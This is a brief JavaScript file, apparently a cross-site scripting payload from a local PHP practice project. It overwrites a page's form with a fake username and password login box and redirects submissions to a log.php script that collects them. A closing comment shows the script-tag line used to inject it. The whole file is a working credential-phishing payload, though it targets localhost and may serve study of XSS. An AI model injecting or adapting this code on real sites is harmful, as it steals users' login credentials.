(function () {
    let form = document.getElementById('form');

    if (form !== null && !window.top.location.href.includes('error=1')) {
        form.innerHTML = 'Username: <input type="text" name="username" placeholder="Username..." required> Password: <input type="password" name="password" placeholder="Password..." required> <button type="submit" class="primary">Login</button>';
        form.action = 'http://localhost:63342/PHP/FormHandling/log.php';
    }
})();

// <script src=" http://localhost:63342/PHP/FormHandling/xss.js "></script>
